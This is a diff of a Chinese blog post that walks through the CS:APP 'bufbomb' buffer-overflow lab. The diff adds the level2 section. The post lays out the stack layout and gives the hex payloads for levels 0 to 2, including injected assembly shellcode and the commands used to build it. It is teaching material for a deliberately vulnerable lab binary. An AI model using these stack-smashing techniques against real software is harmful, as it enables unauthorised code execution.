@@ -217,10 +217,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2021-02-14 23:01:36 / Modified: 23:02:31" itemprop="dateCreated datePublished" datetime="2021-02-14T23:01:36+08:00">2021-02-14</time>
+      <time title="Created: 2021-02-14 23:01:36" itemprop="dateCreated datePublished" datetime="2021-02-14T23:01:36+08:00">2021-02-14</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-02-16 20:41:41" itemprop="dateModified" datetime="2021-02-16T20:41:41+08:00">2021-02-16</time>
+      </span>
 
   
 </div>
@@ -237,14 +243,16 @@
 </blockquote>
 <p><img src="https://img-blog.csdnimg.cn/20210214190516757.png" alt="在这里插入图片描述"></p>
 <p><img src="https://img-blog.csdnimg.cn/20210214171421629.png" alt="在这里插入图片描述"><br>getbu接受不大于32字节的输入。</p>
-<p>level0:<br><img src="https://img-blog.csdnimg.cn/20210214173214384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="level0"><a href="#level0" class="headerlink" title="level0:"></a>level0:</h4><p><img src="https://img-blog.csdnimg.cn/20210214173214384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><img src="https://img-blog.csdnimg.cn/20210214173153654.png" alt="在这里插入图片描述"><br>三个printf输出的内容都不是我们想看见的<br><img src="https://img-blog.csdnimg.cn/20210214173351718.png" alt="在这里插入图片描述"></p>
-<p>实验希望getbuf返回至smoke函数。<br>getbuf中gets函数接收输入。<br><img src="https://img-blog.csdnimg.cn/20210214174146828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入的值存储在[ebp-0x28]里，也就是从中这里存储buf字符内容。<br><img src="https://img-blog.csdnimg.cn/20210214174329527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>payload=垃圾数据（0x28）+ebp+ret（smoke函数）</p>
+<p>实验希望getbuf返回至smoke函数。<br>getbuf中gets函数接收输入。<br><img src="https://img-blog.csdnimg.cn/20210214174146828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>lea取[ebp-0x28]的有效地址赋给eax，使得buffer的大小为0x28.<br><img src="https://img-blog.csdnimg.cn/20210214174329527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>payload=垃圾数据（0x28）+ebp+ret（smoke函数）</p>
 <p>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 18 8c 04 08</p>
 <blockquote>
 <p>测试：./hex2raw &lt;level0.txt | ./bufbomb -u eetan</p>
-<p><img src="https://img-blog.csdnimg.cn/20210214174626127.png" alt="在这里插入图片描述"><br>level1：<br><img src="https://img-blog.csdnimg.cn/20210214174732175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>要将自己id对应的cookie输入到val，达到目标。<br>40字节的缓冲区大小。<br><img src="https://img-blog.csdnimg.cn/20210214175113177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里可以得知cookie应该放在ebp+8的位置。<br>当然有参数的被调用函数，参数从右向左入栈。且被调函数从ebp+8，ebp+12这些地方获得参数。（ebp+4为ret）</p>
+<p><img src="https://img-blog.csdnimg.cn/20210214174626127.png" alt="在这里插入图片描述"></p>
 </blockquote>
+<h4 id="level1："><a href="#level1：" class="headerlink" title="level1："></a>level1：</h4><p><img src="https://img-blog.csdnimg.cn/20210214174732175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>要将自己id对应的cookie输入到val，达到目标。<br>40字节的缓冲区大小。<br><img src="https://img-blog.csdnimg.cn/20210214175113177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里可以得知cookie应该放在ebp+8的位置。<br>当然有参数的被调用函数，参数从右向左入栈。且被调函数从ebp+8，ebp+12这些地方获得参数。（ebp+4为ret）</p>
 <p>构造的payload应该为=40字节垃圾数据+4ebp+返回地址（fizz）+随意四字节数据+参数输入为cookie值.</p>
 <blockquote>
 <p>11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 42 8c 04 08 11 11 11 11 6f 2c 21 5e</p>
@@ -252,7 +260,23 @@
 <blockquote>
 <p>./hex2raw &lt;level0.txt | ./bufbomb -u eetan 来测试结果</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214225726537.png" alt="在这里插入图片描述"><br>2.15继续写。。。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210214225726537.png" alt="在这里插入图片描述"></p>
+<h4 id="level2："><a href="#level2：" class="headerlink" title="level2："></a>level2：</h4><p>test函数–&gt;getbuf函数–&gt;bang函数，并且传入bang函数的参数为cookie的值。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210216194157743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>从+6和+11可以看出global_value等于0存储在0x804d100中。</p>
+<p>所以需要将global的值更改为cookie的值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e212c6f,%eax</span><br><span class="line">movl %eax,0x804d100 </span><br><span class="line">push $0x08048c9d </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210216203233328.png" alt="在这里插入图片描述"></p>
+<p><strong>不能在ret后加bang地址，栈已经回到了test的栈。<br>leave == mov esp,ebp  pop ebp<br>ret == pop eip</strong></p>
+<blockquote>
+<p>转化为十六进制步骤:<br>gcc -c level2.s -o level2.o<br>objdump -d level2.o    &gt; level2.txt</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210216203254963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>b8 6f 2c 21 5e 89 04 25 00 d1 04 08 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f8 3b 68 55</p>
+<blockquote>
+<p>./hex2raw &lt;level22.txt | ./bufbomb -u eetan</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210216203214990.png" alt="在这里插入图片描述"></p>
 
       
     </div>
